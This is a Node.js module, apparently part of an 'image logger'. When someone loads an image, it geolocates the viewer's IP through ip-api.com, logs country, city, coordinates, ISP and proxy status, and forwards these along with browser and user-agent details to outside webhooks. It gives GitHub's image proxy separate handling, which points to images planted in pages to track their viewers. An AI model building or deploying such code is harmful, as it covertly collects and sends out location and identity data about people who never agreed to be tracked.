const path = require('path')
const logger = require('./logger')
const { sendImageToWebhooks, sendImageToWebhooksGithub } = require('./webhook')

const config = require('./config.json')

const ipInfo = async (
  clientIP,
  imageName,
  imageUrl,
  os,
  browser,
  userAgent
) => {
  if (!clientIP) return

  if (clientIP === '::1') {
    clientIP = '207.97.227.239'
  }

  if (clientIP.substr(0, 7) === '::ffff:') {
    clientIP = clientIP.substr(7)
  }

  if (clientIP !== 'not found') {
    try {
      const infoReq = `http://ip-api.com/json/${clientIP}?fields=16976857`
      const infoRes = await fetch(infoReq)
      const infoJson = await infoRes.json()
      const {
        country,
        regionName,
        city,
        lat,
        lon,
        timezone,
        isp,
        as,
        mobile,
        proxy,
        hosting
      } = infoJson

      let url
      try {
        const scriptPath = path.dirname(__filename)
        const absoluteImagePath = path.join(scriptPath, imageUrl)
        const fileUrl = `file://${absoluteImagePath}`
        url = new URL(fileUrl)
      } catch (error) {
        logger.error(`Invalid image URL: ${error}`)
        return
      }

      logger.info(
        `Client's information: Country: ${country}, Region: ${regionName}, City: ${city}, Coordinates: ${lat}, ${lon}, Timezone: ${timezone}, ISP: ${isp}, AS: ${as}, Mobile: ${mobile}, Proxy: ${proxy}, Hosting: ${hosting}`
      )

      if (userAgent !== 'github-camo' && userAgent !== 'github.com') {
        sendImageToWebhooks(
          imageName,
          imageUrl,
          url,
          clientIP,
          timezone,
          country,
          regionName,
          city,
          lat,
          lon,
          isp,
          as,
          mobile,
          proxy,
          hosting,
          os,
          browser,
          userAgent
        )
      } else {
        sendImageToWebhooksGithub(imageName, imageUrl, url)
      }
    } catch (error) {
      logger.error(`Error getting client's information: ${error}`)
    }
  } else {
    logger.error('Client IP not found')
  }

  return
}

module.exports = ipInfo
